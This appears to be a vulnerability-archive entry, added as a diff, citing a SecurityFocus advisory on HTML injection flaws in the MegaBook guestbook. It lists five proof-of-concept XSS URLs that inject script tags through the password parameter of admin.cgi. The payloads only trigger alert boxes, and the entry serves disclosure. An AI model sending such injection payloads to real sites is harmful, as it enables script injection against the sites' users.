@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/8065/info
+
+MegaBook is prone to multiple HTML injection vulnerabilities. This is due to insufficient sanitization of HTML and script code from user-supplied input, including input supplied to the administrative login page and via the client HTTP User-Agent: header field. Exploitation of these issues could permit hostile HTML or script code to be injected into the guestbook system and rendered in the browser of a legitimate guestbook user.
+
+http://www.example.com/admin.cgi?action=modifypost&entryid=66&password=<script>alert('wvs-xss-magic-string-188784308');</script>
+http://www.example.com/admin.cgi?action=modifypost&entryid=66&password='><script>alert('wvs-xss-magic-string-486624156');</script>
+http://www.example.com/admin.cgi?action=modifypost&entryid=66&password="><script>alert('wvs-xss-magic-string-1852691616');</script>
+http://www.example.com/admin.cgi?action=modifypost&entryid=66&password=><script>alert('wvs-xss-magic-string-429380114');</script>
+http://www.example.com/admin.cgi?action=modifypost&entryid=66&password=&lt;/textarea&gt;<script>alert('wvs-xss-magic-string-723975367');</script>
